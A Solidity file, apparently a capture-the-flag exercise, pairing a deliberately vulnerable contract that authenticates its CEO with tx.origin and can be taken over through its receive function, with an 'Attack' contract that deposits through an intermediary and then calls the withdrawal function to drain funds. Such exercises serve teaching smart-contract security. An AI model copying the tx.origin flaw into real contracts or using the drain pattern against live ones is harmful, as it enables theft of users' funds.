// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract CEOByPass {
    mapping(address => uint) public wallet;
    address payable public ceo;

    constructor() public {
        ceo = payable(msg.sender);
        wallet[ceo] = 10000 * (1 ether);
    }

    modifier onlyCEO {
        require(tx.origin == ceo);
        _;
    }

    function addToMyWallet() public payable {
        require(tx.origin != msg.sender);
        require(msg.value <= 0.1 ether);
        wallet[ceo] += msg.value;
        if (wallet[tx.origin] > wallet[ceo])
            ceo = payable(tx.origin);
    }

    function getMyWallet() public view returns (uint) {
        return wallet[tx.origin];
    }

    function withdrawCEOWallet() public onlyCEO {
        ceo.transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && wallet[ceo] > 10000 ether);
        ceo = payable(tx.origin);
    }
}

contract Attack {

    CEOByPass public byPass;

    constructor(CEOByPass _byPass) public  {
        byPass =_byPass;
   
    }
 
  
      function getTxBalance() public view returns (uint256) {
        return byPass.getMyWallet();
    }


  
  function deposit() public payable {
       byPass.addToMyWallet{value:msg.value}();
      
    }

      function attack() public {
       
       byPass.withdrawCEOWallet();
      
    }
      
    
}